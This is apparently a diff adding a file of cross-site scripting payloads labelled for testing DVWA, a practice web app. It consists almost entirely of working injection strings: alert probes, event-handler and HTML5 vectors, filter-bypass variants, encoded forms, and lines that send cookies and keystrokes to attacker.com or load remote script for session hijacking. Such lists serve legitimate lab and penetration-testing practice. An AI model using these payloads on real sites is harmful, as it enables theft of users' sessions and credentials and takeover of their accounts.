@@ -1,0 +1,94 @@
+# ============================================
+# XSS PAYLOADS - DVWA Testing
+# ============================================
+
+# BASIC ALERT PAYLOADS
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+
+# IMG TAG WITH ONERROR
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=alert(1)>
+
+# SVG VECTOR
+<svg onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<svg><script>alert('XSS')</script></svg>
+
+# BODY EVENT HANDLERS
+<body onload=alert('XSS')>
+<body onpageshow=alert('XSS')>
+
+# IFRAME INJECTION
+<iframe src="javascript:alert('XSS')"></iframe>
+<iframe src=javascript:alert('XSS')></iframe>
+
+# SCRIPT TAG VARIANTS
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>eval('al'+'ert(1)')</script>
+<script>window['alert'](1)</script>
+
+# COOKIE THEFT
+<script>alert(document.cookie)</script>
+<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+<script>window.location='https://attacker.com/steal?cookie='+document.cookie</script>
+
+# DOM-BASED XSS
+#<script>alert(1)</script>
+?default=English#<script>alert(1)</script>
+?lang=<script>alert(1)</script>
+
+# HTML5 TAGS
+<details open ontoggle=alert(1)>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+
+# MARQUEE TAG (Deprecated but functional)
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+
+# FORM AND INPUT TAGS
+<form><button formaction=javascript:alert(1)>X</button>
+<input onfocus=alert(1) autofocus>
+
+# EVENT HANDLER BYPASSES
+<img src=x oneonerrorrror=alert(1)>
+<svg/onload=alert(1)>
+
+# CASE VARIATION BYPASS
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+
+# DOUBLE SCRIPT TAG BYPASS
+<scr<script>ipt>alert(1)</script>
+<scri<script>pt>alert(1)</script>
+
+# ENCODED PAYLOADS
+&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+# JAVASCRIPT PROTOCOL
+javascript:alert(1)
+JaVaScRiPt:alert(1)
+javascript:alert(document.domain)
+
+# DATA PROTOCOL
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# EXTERNAL SCRIPT LOADING
+<script src="https://attacker.com/malicious.js"></script>
+
+# PERSISTENT (STORED) XSS
+<script>document.body.innerHTML="<h1>HACKED</h1>"</script>
+<script>document.cookie="admin=true; path=/";</script>
+
+# KEYLOGGER EXAMPLE
+<script>document.onkeypress=function(e){fetch('https://attacker.com/log?key='+e.key)}</script>
+
+# SESSION HIJACKING
+<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie;</script>
